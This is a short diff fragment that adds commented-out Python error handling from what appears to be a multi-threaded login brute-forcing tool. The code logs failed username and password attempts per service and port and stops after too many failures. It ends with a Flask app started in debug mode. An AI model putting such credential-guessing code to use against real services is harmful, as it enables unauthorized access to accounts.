+#         print(f"[-] Login failed for {service_name} - {username}:{password} on port {port}: {e}")
+#         failed_attempts += 1
+#         if failed_attempts >= max_failed_attempts:
+#             print(f"[-] Too many failed attempts on {service_name} at port {port}. Stopping.")
+#             stop_flag_getter = True
+
+#     except Exception as e:
+#         print(f"[!!] Unexpected error: {e}")
+
+#     finally:
+#         thread_limiter.release()
+
+
 
 if __name__ == '__main__':
     app.run(debug=True)
